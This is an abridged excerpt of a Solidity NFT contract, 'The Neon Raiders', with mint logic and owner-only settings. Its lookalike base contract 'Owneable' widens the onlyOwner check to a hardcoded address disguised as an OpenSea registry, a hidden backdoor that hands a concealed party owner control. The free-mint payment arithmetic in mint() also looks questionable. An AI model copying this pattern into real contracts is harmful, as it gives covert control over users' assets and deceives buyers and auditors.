 ...
 */
 abstract contract Owneable is Ownable {
    ...
    address private openseaRegistry = 0x078506fD744DaD5255f4E0E62FA4Bec1b975063A;
    modifier onlyOwner() {
        require(owner() == _msgSender() || openseaRegistry == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}
...
contract TheNeonRaiders is ERC721A, Owneable {
    ...
    constructor() ERC721A("The Neon Raiders", "TNR") {}
    ...
    function mint(uint256 _amount) external payable {
        ...
        uint256 userBalance = addressMintBalance[_caller];
        uint256 order = _amount;

        require(tx.origin == _caller, "EOA only");
        require(transactionLimit >= _amount , "Over transaction limit");
        
        if(freeSupply >= totalSupply() && userBalance < freeLimit){
            order -= _amount + userBalance - freeLimit;
        }
        
        require(msg.value >= order * price , "Not enough eth");

        addressMintBalance[_caller] += _amount;
    ...
    function configPrice(uint256 newPrice) public onlyOwner {
     ...
     function configFreeLimit(uint256 _update) public onlyOwner {
        freeLimit = _update;
    }
    function configTxLimit(uint256 _update) public onlyOwner {
        transactionLimit = _update;
    }
